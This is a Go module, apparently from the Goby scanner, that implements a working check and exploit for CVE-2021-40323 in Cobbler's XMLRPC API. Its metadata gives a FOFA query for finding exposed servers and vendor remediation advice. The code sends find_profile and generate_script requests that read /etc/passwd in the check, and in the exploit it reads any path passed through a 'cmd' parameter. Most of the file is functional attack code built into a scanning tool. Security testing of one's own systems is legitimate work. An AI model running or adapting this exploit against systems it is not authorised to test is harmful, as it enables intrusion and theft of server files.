package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cobbler 3.3.0 XMLRPC cobbler_api Api RCE (CVE-2021-40323)",
    "Description": "<p>Cobbler is a network installation server suite, which is mainly used to quickly build a Linux network installation environment.</p><p>Versions prior to Cobbler 3.3.0 have a command execution vulnerability, and attackers can use the vulnerability to execute arbitrary commands and gain server privileges.</p>",
    "Impact": "<p>Cobbler 3.3.0 XMLRPC RCE</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/cobbler/cobbler/releases/tag/v3.3.0\">https://github.com/cobbler/cobbler/releases/tag/v3.3.0</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Cobbler",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Cobbler 3.3.0 版本 XMLRPC cobbler_api 接口远程命令执行漏洞（CVE-2021-40323）",
            "Product": "Cobbler",
            "Description": "<p>Cobbler是一款网络安装服务器套件，它主要用于快速建立Linux网络安装环境。</p><p>Cobbler 3.3.0 之前的版本存在命令执行漏洞，攻击者可利用漏洞执行任意命令，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/cobbler/cobbler/releases/tag/v3.3.0\">https://github.com/cobbler/cobbler/releases/tag/v3.3.0</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Cobbler 3.3.0 之前的版本存在命令执行漏洞，攻击者可利用漏洞执行任意命令，获取服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Cobbler 3.3.0 XMLRPC cobbler_api Api RCE (CVE-2021-40323)",
            "Product": "Cobbler",
            "Description": "<p>Cobbler is a network installation server suite, which is mainly used to quickly build a Linux network installation environment.</p><p>Versions prior to Cobbler 3.3.0 have a command execution vulnerability, and attackers can use the vulnerability to execute arbitrary commands and gain server privileges.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/cobbler/cobbler/releases/tag/v3.3.0\">https://github.com/cobbler/cobbler/releases/tag/v3.3.0</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Cobbler 3.3.0 XMLRPC RCE</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"/cobbler_webui_content/style.css\"",
    "GobyQuery": "body=\"/cobbler_webui_content/style.css\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/cobbler/cobbler",
    "DisclosureDate": "2022-02-04",
    "References": [
        "http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202110-145"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-40323"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202110-145"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10256"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cobbler_api"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "text/xml")
			cfg1.Data = `<?xml version='1.0'?>
        <methodCall>
          <methodName>find_profile</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                    <name>name</name>
                    <value>
                      <string>*</string>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "<methodResponse>") {
					NameFind := regexp.MustCompile("<value><string>(.*?)</string></value>").FindStringSubmatch(resp1.RawBody)
					uri2 := "/cobbler_api"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "text/xml")
					cfg2.Data = fmt.Sprintf(`<?xml version='1.0'?>
        <methodCall>
          <methodName>generate_script</methodName>
          <params>
            <param>
              <value>
                <string>%s</string>
              </value>
            </param>
            <param>
              <value>
                <string></string>
              </value>
            </param>
            <param>
              <value>
                <string>/etc/passwd</string>
              </value>
            </param>
          </params>
        </methodCall>`, NameFind[1])
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp2.RawBody)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/cobbler_api"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "text/xml")
			cfg1.Data = `<?xml version='1.0'?>
        <methodCall>
          <methodName>find_profile</methodName>
          <params>
            <param>
              <value>
                <struct>
                  <member>
                    <name>name</name>
                    <value>
                      <string>*</string>
                    </value>
                  </member>
                </struct>
              </value>
            </param>
          </params>
        </methodCall>`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "<methodResponse>") {
					NameFind := regexp.MustCompile("<value><string>(.*?)</string></value>").FindStringSubmatch(resp1.RawBody)
					uri2 := "/cobbler_api"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "text/xml")
					cfg2.Data = fmt.Sprintf(`<?xml version='1.0'?>
        <methodCall>
          <methodName>generate_script</methodName>
          <params>
            <param>
              <value>
                <string>%s</string>
              </value>
            </param>
            <param>
              <value>
                <string></string>
              </value>
            </param>
            <param>
              <value>
                <string>%s</string>
              </value>
            </param>
          </params>
        </methodCall>`, NameFind[1], cmd)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						body := regexp.MustCompile("<value><string>((.||\n)*?)</string></value>").FindStringSubmatch(resp2.RawBody)
						expResult.Output = body[1]
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
